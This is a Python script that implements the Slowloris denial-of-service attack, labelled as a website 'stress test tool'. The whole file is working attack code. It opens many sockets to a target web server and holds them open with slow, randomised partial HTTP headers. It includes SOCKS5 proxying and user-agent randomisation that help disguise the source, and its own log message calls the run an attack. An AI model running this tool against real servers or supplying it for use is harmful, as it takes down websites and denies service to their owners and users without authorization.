#!/usr/bin/env python3
import argparse
import logging
import random
import socket
import sys
import time
import string

parser = argparse.ArgumentParser(
    description="Slowloris, low bandwidth stress test tool for websites"
)
parser.add_argument("host", nargs="?", help="Host to perform stress test on")
parser.add_argument(
    "-p", "--port", default=80, help="Port of webserver, usually 80", type=int
)
parser.add_argument(
    "-s",
    "--sockets",
    default=150,
    help="Number of sockets to use in the test",
    type=int,
)
parser.add_argument(
    "-v", "--verbose", dest="verbose", action="store_true", help="Increases logging"
)
parser.add_argument(
    "-ua",
    "--randuseragents",
    dest="randuseragent",
    action="store_true",
    help="Randomizes user-agents with each request",
)
parser.add_argument(
    "-uaf",
    "--useragentfile",
    default="custom.txt",
    help="Reads user agents from file",
)
parser.add_argument(
    "-x",
    "--useproxy",
    dest="useproxy",
    action="store_true",
    help="Use a SOCKS5 proxy for connecting",
)
parser.add_argument("--proxy-host", default="127.0.0.1", help="SOCKS5 proxy host")
parser.add_argument("--proxy-port", default="8080", help="SOCKS5 proxy port", type=int)
parser.add_argument(
    "--https", dest="https", action="store_true", help="Use HTTPS for the requests"
)
parser.add_argument(
    "--sleeptime",
    dest="sleeptime",
    default=15,
    type=int,
    help="Time to sleep between each header sent.",
)
parser.set_defaults(verbose=False)
parser.set_defaults(randuseragent=False)
parser.set_defaults(useproxy=False)
parser.set_defaults(https=False)
args = parser.parse_args()

if len(sys.argv) <= 1:
    parser.print_help()
    sys.exit(1)

if not args.host:
    print("Host required!")
    parser.print_help()
    sys.exit(1)

if args.useproxy:
    # Tries to import to external "socks" library
    # and monkey patches socket.socket to connect over
    # the proxy by default
    try:
        import socks
        socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, args.proxy_host, args.proxy_port)
        socket.socket = socks.socksocket
        logging.info("Using SOCKS5 proxy for connecting...")
    except ImportError:
        logging.error("Socks Proxy Library Not Available!")

if args.verbose:
    logging.basicConfig(
        format="[%(asctime)s] %(message)s",
        datefmt="%d-%m-%Y %H:%M:%S",
        level=logging.DEBUG,
    )
else:
    logging.basicConfig(
        format="[%(asctime)s] %(message)s",
        datefmt="%d-%m-%Y %H:%M:%S",
        level=logging.INFO,
    )

if args.https:
    logging.info("Importing ssl module")
    import ssl

list_of_sockets = []
defaut_user_agent = "curl/7.72.0"

## Create socket
def init_socket(ip):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    if args.https:
        s = ssl.wrap_socket(s)

    s.connect((ip, args.port))

    s.send("GET {}.html HTTP/1.1\r\n".format(random.randint(1, 10)).encode("utf-8"))
    s.send("Host: {}\r\n".format(ip).encode("utf-8"))
    if args.randuseragent:
        user_agents = ""
        try:
            with open(args.useragentfile) as f:
                user_agents = f.read().splitlines()
                s.send("User-Agent: {}\r\n".format(random.choice(user_agents)).encode("utf-8"))
        except EnvironmentError:
            print("Could not open file {}".format(user_agents_file))
            s.send("User-Agent {}\r\n".format(defaut_user_agent).encode("utf-8"))
    else:
        s.send("User-Agent: {}\r\n".format(defaut_user_agent).encode("utf-8"))
   
    return s


def main():
    ip = args.host
    socket_count = args.sockets
    logging.info("Attacking %s with %s sockets.", ip, socket_count)


    ## Create sockets to attack server
    logging.info("Creating sockets...")
    for _ in range(socket_count):
        try:
            logging.debug("Creating socket nr %s", _)
            s = init_socket(ip)
        except socket.error as e:
            logging.debug(e)
            break
        list_of_sockets.append(s)


    ## For each socket send keep alive headers in order to keep the connection alive
    while True:
        try:
            logging.info(
                "Sending keep-alive headers... Socket count: %s", len(list_of_sockets)
            )
            for s in list(list_of_sockets):
                try:
                    N1 = random.randint(1,40)
                    header_key = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(N1))
                    s.send(
                        "{}: {}\r\n".format(header_key, random.randint(1, 5000)).encode("utf-8")
                    )
                except socket.error:
                    list_of_sockets.remove(s)

            ## If any socket fails the connection is recreated with another socket.
            for _ in range(socket_count - len(list_of_sockets)):
                logging.debug("Recreating socket...")
                try:
                    s = init_socket(ip)
                    if s:
                        list_of_sockets.append(s)
                except socket.error as e:
                    logging.debug(e)
                    break
            logging.debug("Sleeping for %d seconds", args.sleeptime)
            time.sleep(args.sleeptime)

        except (KeyboardInterrupt, SystemExit):
            logging.info("Stopping Slowloris")
            break


if __name__ == "__main__":
    main()
